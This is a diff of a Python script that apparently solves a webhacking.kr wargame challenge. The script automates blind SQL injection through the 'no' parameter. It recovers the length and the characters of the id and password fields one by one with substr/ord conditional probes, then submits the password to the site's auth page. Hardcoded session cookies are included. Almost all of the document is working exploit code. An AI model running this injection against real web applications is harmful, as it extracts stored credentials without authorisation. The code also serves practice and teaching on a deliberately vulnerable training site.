@@ -1,46 +1,149 @@
 #-*- coding: utf-8 -*-
+import sys
+import urllib
 import urllib2
+
 import CookieManager
 
-baseUrl  = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"
-idParam  = "no=2%%20and%%20if(substr(id,%d,1)in(%s),1,0)"
-pwParam  = "no=2%%20and%%20if(substr(pw,%d,1)in(%s),1,0)"
-answerId = ""
-answerPw = ""
-answer   = ""
 
-# 1. 주소를 봤을 때 no, id, pw가 있으니 id부터 구해보자
-# exists select * from ? where no=#{no}로 생각하고 시작
-# 0을 넣었을떄 result가 없고 1과 2는 True, 나머진 False로 추정 => row가 두개(둘다 해보면 될듯)
-# 2는 false인데 2 or 1=1 하니까 잘 되는걸 보니 필터는 없다
-# and조건으로 id를 찾아보자
-print "1. find id"
-for caretIndex in range(1, 6):
-    print "    [%02d] extract..." % (caretIndex), 
-    for charIndex in range(ord('a'), ord('z')):
-        httpRequest = urllib2.Request(baseUrl + "?" + idParam % (caretIndex, hex(charIndex)))
-        CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
+challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"
+
+for noIdx in range(1, 3):
+    print "[*] Finding id length"
+    idLength = 0
+    isFoundIdLength = False
+    
+    CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
+    
+    for idLength in range(1, 20):
+        parameter = "if(length(id)=%d,%d,3)" % (idLength, noIdx)
+        httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
         httpRequest.add_header("Cookie", CookieManager.getCookie())
-        httpResponse = httpRequest.read()
-        if str(httpResponse).find("True") >= 0:
-            print chr(charIndex)
-            answerId += chr(charIndex)
-            break
+        
+        httpConnection = None
+        try:
+            httpConnection = urllib2.urlopen(httpRequest)
+            httpResponse = httpConnection.read()
+            print "[*] Blind SQL Injection...", idLength
+            if httpResponse.find("True") > 0:
+                print "[+] FIND IT! id length is [", idLength, "]"
+                isFoundIdLength = True
+                break
+        except:
+            raise
+        finally:
+            if httpConnection != None:
+                httpConnection.close()
+    
+    if not isFoundIdLength:
+        sys.exit(-1)
+    
+    idValue = ""
+    
+    for caretIndex in range(1, idLength+1):
+        print
+        print "[*] Blind SQL Injection...", caretIndex, "", 
+        for charIndex in range(0x20, 0x7e):
+            sys.stdout.write(".")
+            parameter = "if(ord(substr(id,%d,1))=%d,%d,3)" % (caretIndex, charIndex, noIdx)
+            httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
+            httpRequest.add_header("Cookie", CookieManager.getCookie())
+            
+            httpConnection = None
+            try:
+                httpConnection = urllib2.urlopen(httpRequest)
+                httpResponse = httpConnection.read()
+                if httpResponse.find("True") > 0:
+                    print 
+                    print "[+] FIND IT!", chr(charIndex)
+                    idValue += chr(charIndex)
+                    break
+            except:
+                raise
+            finally:
+                if httpConnection != None:
+                    httpConnection.close()
+    
+    print
+    print "[!] id is [", idValue, "]"
+    print
+    
+    if idValue == "admin":
+        print "[*] Finding password length"
+        pwLength = 0
+        isFoundPwLength = False
+        
+        CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
+        
+        for pwLength in range(1, 20):
+            parameter = "if(length(pw)=%d,%d,3)" % (pwLength, noIdx)
+            httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
+            httpRequest.add_header("Cookie", CookieManager.getCookie())
+            
+            httpConnection = None
+            try:
+                httpConnection = urllib2.urlopen(httpRequest)
+                httpResponse = httpConnection.read()
+                print "[*] Blind SQL Injection...", pwLength
+                if httpResponse.find("True") > 0:
+                    print "[+] FIND IT! pw length is [", pwLength, "]"
+                    isFoundIdLength = True
+                    break
+            except:
+                raise
+            finally:
+                if httpConnection != None:
+                    httpConnection.close()
+        
+        if not isFoundIdLength:
+            sys.exit(-1)
 
-print "result >> [%s]" % answerId
-print 
-print "2. find pw"
+        print "[*] Finding pw Value"
+        pwValue = ""
+        
+        for caretIndex in range(1, pwLength+1):
+            print
+            print "[*] Blind SQL Injection...", caretIndex, "", 
+            for charIndex in range(0x20, 0x7e):
+                sys.stdout.write(".")
+                parameter = "if(ord(substr(pw,%d,1))=%d,%d,3)" % (caretIndex, charIndex, noIdx)
+                httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
+                httpRequest.add_header("Cookie", CookieManager.getCookie())
+                
+                httpConnection = None
+                try:
+                    httpConnection = urllib2.urlopen(httpRequest)
+                    httpResponse = httpConnection.read()
+                    if httpResponse.find("True") > 0:
+                        print 
+                        print "[+] FIND IT!", chr(charIndex)
+                        pwValue += chr(charIndex)
+                        break
+                except:
+                    raise
+                finally:
+                    if httpConnection != None:
+                        httpConnection.close()
+        
+        print "[!] pw is [", pwValue, "]"
+        break
 
-for caretIndex in range(1, 20):
-    print "    [%02d] extract..." % (caretIndex), 
-    for charIndex in range(ord('a'), ord('z')):
-        httpRequest = urllib2.Request(baseUrl + "?" + pwParam % (caretIndex, hex(charIndex)))
-        CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
-        httpRequest.add_header("Cookie", CookieManager.getCookie())
-        httpResponse = httpRequest.read()
-        if str(httpResponse).find("True") >= 0:
-            print chr(charIndex)
-            answerPw += chr(charIndex)
-            break
+challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
+parameter = urllib.urlencode({
+    "answer": pwValue
+});
+httpRequest = urllib2.Request(challengeUrl, data=parameter)
+CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
+httpRequest.add_header("Cookie", CookieManager.getCookie())
+httpRequest.get_method = lambda: 'POST'
 
-print "result >> [%s]" % answerPw
+httpConnection = None
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
